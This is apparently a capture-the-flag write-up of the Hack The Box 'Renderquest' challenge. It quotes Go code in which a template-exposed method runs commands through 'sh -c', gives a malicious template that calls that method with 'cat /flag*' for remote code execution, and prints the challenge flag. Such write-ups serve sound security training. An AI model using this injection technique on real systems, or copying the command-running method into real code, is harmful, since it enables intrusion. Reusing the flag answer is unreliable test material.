---
description: https://app.hackthebox.com/challenges/renderquest
---

# Renderquest

CHALLENGE DESCRIPTION

You've found a website that lets you input remote templates for rendering. Your task is to exploit this system's vulnerabilities to access and retrieve a hidden flag. Good luck!

## Homepage

<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

## Src code review

It's a website that allows you to make websites with templates, the website here will render it and display the output.

The juicy data lies here:

```go
func (p RequestData) FetchServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
	}
	return string(out)
}
```

The provided features of the website will be rendered through this code:

```go
reqData.ClientIP = clientIP
reqData.ClientUA = userAgent
reqData.ClientIpInfo = *locationInfo
reqData.ServerInfo.Hostname = reqData.FetchServerInfo("hostname")
reqData.ServerInfo.OS = reqData.FetchServerInfo("cat /etc/os-release | grep PRETTY_NAME | cut -d '\"' -f 2")
reqData.ServerInfo.KernelVersion = reqData.FetchServerInfo("uname -r")
reqData.ServerInfo.Memory = reqData.FetchServerInfo("free -h | awk '/^Mem/{print $2}'")
```

It's a classic SSTI. Since we can load our own template here, we can abuse `FetchServerInfo` method to get RCE.

### Malicious template

```markup
<html>
<body>

<h1> RCE execution </h1>

<p>{{.ServerInfo.KernelVersion}}</p>
<p>Flag:  {{.FetchServerInfo "cat /flag*" }} </p>

</body>
</html>
```

`{{.FetchServerInfo "cat /flag*" }}` what this line will do is call FetchServerInfo and send `cat /flag*` as a parameter, as it's using `sh -c` it will execute our cmd, giving us the flag

<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

Flag: `HTB{qu35t_f0r_th3_f0rb1dd3n_t3mpl4t35!!}`

## Reference

{% embed url="https://www.onsecurity.io/blog/go-ssti-method-research/" %}

\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning
